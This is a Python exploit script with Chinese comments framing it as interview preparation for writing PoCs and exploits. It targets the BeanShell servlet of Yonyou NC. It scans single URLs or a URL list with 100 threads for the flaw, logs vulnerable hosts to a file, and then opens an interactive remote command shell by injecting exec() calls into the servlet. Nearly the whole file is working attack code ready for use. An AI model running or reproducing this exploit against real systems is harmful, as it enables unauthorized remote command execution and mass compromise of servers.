# exp 漏洞利用
# 第一步 先手工检测是否存在漏洞 
# 第二步 使用脚本检测漏洞是否存在
# 漏洞利用
# 面试关于python 会问那些问题
# 问的最多的就是
# 会写poc吗 会写exp吗 写过那些poc 写过那些exp 用过那些库(requests,sys,os,argparse....)
# 用友NC
import argparse,sys,requests,time,os,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def main():
    banner()
    parser = argparse.ArgumentParser(description="yongyou_nc exp")
    parser.add_argument('-u','--url',help='input your attack url')
    parser.add_argument('-f','--file',help='input your attack file')
    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(print(f"Usag:\n\t python3 {sys.argv[0]} -h"))


def banner():
    test = """

██╗   ██╗ ██████╗ ███╗   ██╗ ██████╗██╗   ██╗ ██████╗ ██╗   ██╗    ███╗   ██╗ ██████╗
╚██╗ ██╔╝██╔═══██╗████╗  ██║██╔════╝╚██╗ ██╔╝██╔═══██╗██║   ██║    ████╗  ██║██╔════╝
 ╚████╔╝ ██║   ██║██╔██╗ ██║██║  ███╗╚████╔╝ ██║   ██║██║   ██║    ██╔██╗ ██║██║     
  ╚██╔╝  ██║   ██║██║╚██╗██║██║   ██║ ╚██╔╝  ██║   ██║██║   ██║    ██║╚██╗██║██║     
   ██║   ╚██████╔╝██║ ╚████║╚██████╔╝  ██║   ╚██████╔╝╚██████╔╝    ██║ ╚████║╚██████╗
   ╚═╝    ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝   ╚═╝    ╚═════╝  ╚═════╝     ╚═╝  ╚═══╝ ╚═════╝
                                                                                     

"""
    print(test)

def poc(target):
    headers={
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    }
    url = target+"/servlet/~ic/bsh.servlet.BshServlet"
    data={'bsh.script':'print("sis2311");'}
    try:
        res = requests.post(url,headers=headers,data=data,timeout=5,verify=False).text
        if "sis2311" in res:
            print(f"[+] 经检查,{target} is vulable")
            with open("vulable.txt","a+",encoding="utf-8") as f:
                f.write(target+"\n")
            return True
        else:
            print(f"[-] 经检查,{target} is not vulable")
            return False
    except:
        print(f"[*] {target} error")
        return False

def exp(target):
    print("正在努力的给你搞一个shell....请休息一下")
    time.sleep(2)
    os.system('cls')
    while True:
        cmd = input('请输出你要执行的命令,按q退出:')
        if cmd == 'q':
            exit()
        url = target + '/servlet/~ic/bsh.servlet.BshServlet'
        headers={
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        }
        data = {'bsh.script':f'exec("{cmd}");'}
        try:
            res = requests.post(url=url,headers=headers,data=data,timeout=5,verify=False).text
            result = re.findall('<pre>(.*?)</pre>',res,re.S)[0]
            print(result)
        except:
            pass


if __name__ == '__main__':
    main()